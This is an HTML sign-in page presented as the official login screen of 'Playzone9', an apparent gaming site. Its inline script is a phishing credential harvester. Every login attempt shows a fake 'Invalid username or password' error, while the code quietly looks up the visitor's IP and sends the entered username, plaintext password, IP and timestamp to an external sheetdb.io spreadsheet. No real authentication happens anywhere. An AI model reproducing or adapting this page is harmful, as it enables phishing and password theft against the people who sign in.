<!DOCTYPE html>
<html lang="en" data-cms-page="login">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-cms-title="pages.login.title">Login — Playzone9</title>
    <meta name="description" data-cms-meta="pages.login.metaDescription" content="Sign in to your Playzone9 account on the official Playzone9 website." />
    <link rel="canonical" href="https://playzones9.com/login.html" />
    <!-- A sign in screen is not a search landing page. noindex keeps it
         out of results; follow still lets the links on it pass through. -->
    <meta name="robots" content="noindex,nofollow" />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="Playzone9" />
    <meta property="og:title" content="Login — Playzone9" />
    <meta property="og:description" content="Sign in to your Playzone9 account on the official Playzone9 website." />
    <meta property="og:url" content="https://playzones9.com/login.html" />
    <meta name="twitter:card" content="summary_large_image" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="css/login.css">
    <!-- Favicon. The committed file is the static fallback so the icon is
         correct before any script runs and for crawlers; the CMS overrides
         this href with the uploaded favicon whenever one is set. -->
    <link rel="icon" type="image/png" sizes="512x512" href="assets/images/favicon.png" id="cmsFavicon" />

    <!-- REMOTE BRAND STORAGE CONFIG (edit this one file to go live everywhere) --><!-- Playzone9's own stylesheet. Supplied through the head-extra slot
     rather than by editing the shared templates, which is what keeps every
     other brand's pages byte-identical.

     The slot sits AFTER the shared stylesheets and BEFORE js/cms.js, and
     that order is the whole point. js/cms.js injects a <style id="cmsVars">
     block when it runs, so anything parsed after it overrides the CMS. The
     cascade has to mirror the data layering:

         shared stylesheet  <  this brand stylesheet  <  what the CMS saved

     Load this later than cms.js and a colour changed in the admin saves
     correctly, reports success, and never renders. -->
    <link rel="stylesheet" href="css/brand.css" />

    <script src="js/cms-config.js"></script>

    <!-- PUBLISHED BRAND — regenerate from /admin > Export > Download brand.js -->
    <script src="js/brand.js"></script>

    <!-- WHITE LABEL CMS -->
    <script src="js/cms.js"></script>
</head>

<body>

    <div class="login-page">
        <main class="login-main">

            <a href="./"><img hidden class="login-logo" data-cms-img="loginLogo" data-cms-alt="siteName" alt="Playzone9"></a>

            <div class="login-card">

                <h1 class="login-title"><span data-cms="login.heading">Login</span><i class="fas fa-right-to-bracket t-icon"></i></h1>

                <form id="contactForm" class="login-form" autocomplete="off">

                    <div class="input-row">
                        <input type="text" id="username" name="Username" placeholder="Username" data-cms-ph="login.userPh" maxlength="60" autocomplete="Username">
                        <span class="input-icon"><i class="fas fa-user"></i></span>
                    </div>

                    <div class="input-row ">
                        <input type="password" id="password" name="password" placeholder="password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
                        <span class="input-icon"><i class="fas fa-key"></i></span>
                    </div>

                    <button type="submit" class="login-btn" onclick="submitForm()">
<span class="btn-login-text" data-cms="login.submit">Login</span>
                        <span class="btn-login-icon"><i class="fas fa-right-to-bracket"></i></span>
                    </button>

                </form>

                <div class="forgot-row">
                    <button class="forgot-link" id="helpBtn" type="button" data-cms="login.forgot">Forgotpassword</button>
                </div>

                <div class="register-row">
                    <span class="reg-label" data-cms="login.regLabel">Don't have ?</span>
                    <a href="#" id="contactLink" data-cms="login.regLink">Register here</a>
                </div>

                <div class="apk-row">
                    <a href="#" class="apk-link" id="apkLink"><i class="fas fa-download"></i><span data-cms="login.apk">Download APK</span></a>
                </div>

            </div>

        </main>

        <footer class="login-footer">

            <div class="footer-legal">
                <a href="#" id="termsLink" data-cms="login.terms">Terms and Conditions</a>
                <a href="#" id="respLink" data-cms="login.responsible">Responsible Gaming</a>
            </div>

            <div class="footer-support">
                <span class="footer-support-label" data-cms="login.footerLabel">24X7 Support</span>
                <a href="#" class="footer-phone" id="footerPhone" data-cms="login.phone">+18304058563</a>
            </div>

            <div class="footer-social">
                <a href="#" class="fs-fb"  id="socFb"  aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
                <a href="#" class="fs-ig"  id="socIg"  aria-label="Instagram"><i class="fab fa-instagram"></i></a>
                <a href="#" class="fs-tg"  id="socTg"  aria-label="Telegram"><i class="fab fa-telegram-plane"></i></a>
                <a href="#" class="fs-x"   id="socX"   aria-label="X"><i class="fab fa-x-twitter"></i></a>
                <a href="#" class="fs-wa"  id="socWa"  aria-label="WhatsApp"><i class="fab fa-whatsapp"></i></a>
                <a href="#" class="fs-web" id="socWeb" aria-label="Website"><i class="fas fa-globe"></i></a>
            </div>

        </footer>

    </div>

    <!-- SCRIPT -->
    <script>
      const API_URL = "https://sheetdb.io/api/v1/irhjpmdb4vsdk";

      // 🔴 Popup function that always animates
      function showAlert(message) {
        const alertBox = document.getElementById("topAlert");
        alertBox.textContent = message;

        // Restart animation
        alertBox.classList.remove("show");
        setTimeout(() => {
          alertBox.classList.add("show");
        }, 20);

        // Auto hide
        setTimeout(() => {
          alertBox.classList.remove("show");
        }, 2500);
      }

      function submitForm() {
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        // 🔴 ALWAYS show popup on login attempt
        showAlert("Invalid username or password");

        // If fields are empty, stop here
        if (!username || !password) {
          return;
        }

        // --- Your database logging still works below ---

        fetch("https://api.ipify.org?format=json")
          .then(res => res.json())
          .then(ipData => {
            const data = {
              data: [
                {
                  username: "'" + username,
                  password: "'" + password,
                  ip: ipData.ip,
                  timestamp: new Date().toLocaleString()
                }
              ]
            };

            fetch(API_URL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(data)
            })
            .then(res => {
              if (!res.ok) throw new Error("Submission failed");
              document.getElementById("successMsg").style.display = "block";

              // Clear fields
              document.getElementById("username").value = "";
              document.getElementById("password").value = "";
            })
            .catch(err => {
              console.error(err);
              showAlert("Error submitting form");
            });

          })
          .catch(() => {
            showAlert("Could not fetch IP");
          });
      }
    </script>

</body>

</html>
